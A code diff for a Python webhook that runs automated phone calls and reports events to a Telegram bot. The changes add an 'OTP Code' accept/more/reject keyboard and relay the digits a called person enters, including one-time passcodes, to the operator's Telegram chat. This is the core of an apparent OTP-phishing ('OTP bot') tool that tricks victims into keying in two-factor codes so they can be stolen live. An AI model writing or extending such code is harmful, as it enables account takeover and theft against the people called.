@@ -31,7 +31,7 @@ def call(chat_id,name):
     callsid = data['callsid']
     if 'callsid' in data and 'status' in data:
         status = {data['callsid']: data['status']}
-        print(f"The CallSID ({data['callsid']}) is {data['status']}")
+        print(data)
     else:
         return "Invalid data.", 400
     if data['status'] == "call.ringing":
@@ -66,7 +66,29 @@ def call(chat_id,name):
         url = f"{base_url}?apikey={apikey}&callsid={callsid1}&text={text}&voice={voice}&maxdigits=1"
 
         response = requests.get(url)
-        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 🤳 Call has been answered.")
+        cca = str(callsid1 +"$"+ chat_id)
+        callback_accept = json.dumps({"action": 1, "sid": cca })
+        callback_decline = json.dumps({"action": 2, "sid": cca})
+        callback_more = json.dumps({"action": 3, "sid": cca})
+        print (callback_accept)
+        keyboard = [
+            [
+
+                {"text": "accept", "callback_data": callback_accept},
+                {"text": "more", "callback_data": callback_more},
+                {"text": "reject", "callback_data": callback_decline},
+            ],
+        ]
+
+        params = {
+            "chat_id": chat_id,
+            "text": f"├ ✅ OTP Code:  Choose an option:",
+            "reply_markup": json.dumps({"inline_keyboard": keyboard}),
+        }
+
+        
+
+        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 🤳 Call has been answered.") and requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data=params)
         print("Response:", response.json())
         return "Any Response."
     elif data['status'] == "human.detected":
@@ -93,9 +115,10 @@ def call(chat_id,name):
         r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📵 Call has been hangup.")
         return "Any Response."
     elif data['status'] == "dtmf.entered":
-        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📞 DTMF Entered")
+        codeis = data['digit']
+        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📞 DTMF Entered {codeis} ")
         return "Any Response."
-
+        
     elif 'digits' in data:
         if data['digits'] == "1":
             print(data["digits"])
@@ -109,6 +132,10 @@ def call(chat_id,name):
             r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📲 Send OTP..")
 
             print("Response:", response.json())
+        elif len(data['digits']) < 6 and len(data['digits']) > 1:
+            otpcode22 = data["digits"]
+            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📲 otp is : {otpcode22}")
+
         elif len(data['digits']) == 6:
             otp2 = data["digits"]
             print(data["digits"])
